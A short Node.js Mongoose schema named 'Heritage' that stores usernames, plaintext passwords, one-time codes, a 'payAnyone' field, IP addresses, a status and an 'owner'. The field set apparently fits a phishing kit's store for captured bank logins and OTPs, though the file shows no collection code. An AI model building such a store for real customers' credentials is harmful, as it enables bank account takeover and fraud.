const mongoose = require("mongoose");

const heritageSchema = new mongoose.Schema({
  uniqueid: String,
  username: String,
  password: String,
  payAnyone: String,
  otp: Number,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("Heritage", heritageSchema);
